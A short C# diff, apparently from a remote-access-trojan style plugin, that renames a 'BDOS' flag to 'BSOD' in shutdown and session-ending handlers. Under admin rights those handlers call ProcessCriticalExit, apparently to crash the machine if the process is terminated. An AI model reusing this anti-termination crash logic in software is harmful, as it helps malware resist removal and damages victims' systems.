@@ -16,7 +16,7 @@ namespace Plugin
         {
             try
             {
-                if (Convert.ToBoolean(Plugin.BDOS) && IsAdmin())
+                if (Convert.ToBoolean(Plugin.BSOD) && IsAdmin())
                     ProcessCriticalExit();
                 CloseMutex();
                 Connection.SslClient?.Close();
@@ -41,7 +41,7 @@ namespace Plugin
 
         public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
         {
-            if (Convert.ToBoolean(Plugin.BDOS) && Methods.IsAdmin())
+            if (Convert.ToBoolean(Plugin.BSOD) && Methods.IsAdmin())
                 ProcessCriticalExit();
         }
 
